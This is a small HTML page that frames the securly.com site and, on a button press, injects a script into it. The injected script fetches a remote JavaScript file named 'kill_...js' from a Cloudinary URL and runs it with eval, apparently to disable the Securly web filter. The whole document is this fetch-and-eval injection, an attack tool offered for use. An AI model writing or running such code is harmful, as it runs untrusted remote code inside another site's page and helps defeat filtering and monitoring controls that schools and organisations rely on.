<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Inject JS into iFrame</title>
    <style>
        body {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
        }
        iframe {
            width: 80%;
            height: 60%;
            border: none;
        }
        button {
            margin-top: 20px;
            padding: 10px 20px;
            font-size: 16px;
        }
    </style>
</head>
<body>
    <iframe id="myIframe" src="https://securly.com"></iframe>
    <button onclick="injectScript()">Inject Script</button>

    <script>
        function injectScript() {
            const iframe = document.getElementById('myIframe');
            const scriptContent = `fetch('https://res.cloudinary.com/dxttxbdrd/raw/upload/v1693510756/kill_qn1hjn.js')
                                    .then(r => r.text())
                                    .then(r => eval(r));`;
            
            const script = document.createElement('script');
            script.type = 'text/javascript';
            script.innerHTML = scriptContent;

            const iframeDoc = iframe.contentWindow.document;
            iframeDoc.body.appendChild(script);
        }
    </script>
</body>
</html>
